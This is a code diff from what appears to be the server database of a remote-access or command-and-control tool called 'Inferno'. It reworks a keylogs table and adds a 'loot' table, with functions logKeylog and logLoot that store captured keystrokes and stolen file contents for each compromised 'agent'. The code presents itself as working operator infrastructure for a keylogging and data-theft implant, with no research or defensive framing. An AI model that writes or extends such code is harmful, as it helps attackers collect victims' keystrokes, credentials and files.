@@ -68,11 +68,22 @@ bool Inferno_Database::createTables() {
     // 3. Keylogs Table
     if (!query.exec("CREATE TABLE IF NOT EXISTS keylogs ("
                     "id SERIAL PRIMARY KEY, "
-                    "agent_uuid VARCHAR(64) REFERENCES agents(uuid), "
-                    "window_title TEXT, "
-                    "content TEXT NOT NULL, "
+                    "agent_id INTEGER REFERENCES agents(id), "
+                    "data TEXT, "
                     "timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")) {
         qDebug() << "[Database] Error creating keylogs table:" << query.lastError().text();
+        return false;
+    }
+
+    // 4. Loot Table
+    if (!query.exec("CREATE TABLE IF NOT EXISTS loot ("
+                    "id SERIAL PRIMARY KEY, "
+                    "agent_id INTEGER REFERENCES agents(id), "
+                    "filename TEXT, "
+                    "file_type VARCHAR(32), "
+                    "content BYTEA, "
+                    "timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP)")) {
+        qDebug() << "[Database] Error creating loot table:" << query.lastError().text();
         return false;
     }
 
@@ -102,10 +113,10 @@ int Inferno_Database::registerAgent(const QString& uuid, const QString& ip, cons
     return -1;
 }
 
-void Inferno_Database::logTelemetry(const QString& uuid, const QString& type, const QString& content) {
+bool Inferno_Database::logTelemetry(const QString& uuid, const QString& type, const QString& content) {
     if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") {
         qDebug() << "[Database] WARNING: Attempted to log telemetry for UNKNOWN agent. Dropping data.";
-        return;
+        return false;
     }
     QSqlQuery query;
     query.prepare("INSERT INTO telemetry (agent_uuid, type, content) VALUES (:uuid, :type, :content)");
@@ -115,23 +126,39 @@ void Inferno_Database::logTelemetry(const QString& uuid, const QString& type, co
 
     if (!query.exec()) {
         qDebug() << "[Database] Error logging telemetry:" << query.lastError().text();
+        return false;
     }
+    return true;
 }
 
-void Inferno_Database::logKeylog(const QString& uuid, const QString& windowTitle, const QString& content) {
-    if (uuid.isEmpty() || uuid == "UNKNOWN_UUID") {
-        qDebug() << "[Database] WARNING: Attempted to log keylog for UNKNOWN agent. Dropping data.";
-        return;
-    }
+bool Inferno_Database::logKeylog(const QString& uuid, const QString& data) {
     QSqlQuery query;
-    query.prepare("INSERT INTO keylogs (agent_uuid, window_title, content) VALUES (:uuid, :title, :content)");
-    query.bindValue(":uuid", uuid);
-    query.bindValue(":title", windowTitle);
-    query.bindValue(":content", content);
+    query.prepare("INSERT INTO keylogs (agent_id, data) "
+                  "VALUES ((SELECT id FROM agents WHERE uuid = ?), ?)");
+    query.addBindValue(uuid);
+    query.addBindValue(data);
 
     if (!query.exec()) {
         qDebug() << "[Database] Error logging keylog:" << query.lastError().text();
+        return false;
     }
+    return true;
+}
+
+bool Inferno_Database::logLoot(const QString& uuid, const QString& filename, const QString& fileType, const QByteArray& content) {
+    QSqlQuery query;
+    query.prepare("INSERT INTO loot (agent_id, filename, file_type, content) "
+                  "VALUES ((SELECT id FROM agents WHERE uuid = ?), ?, ?, ?)");
+    query.addBindValue(uuid);
+    query.addBindValue(filename);
+    query.addBindValue(fileType);
+    query.addBindValue(content);
+
+    if (!query.exec()) {
+        qDebug() << "[Database] Error logging loot:" << query.lastError().text();
+        return false;
+    }
+    return true;
 }
 
 void Inferno_Database::setAgentOnlineStatus(const QString& uuid, bool online) {
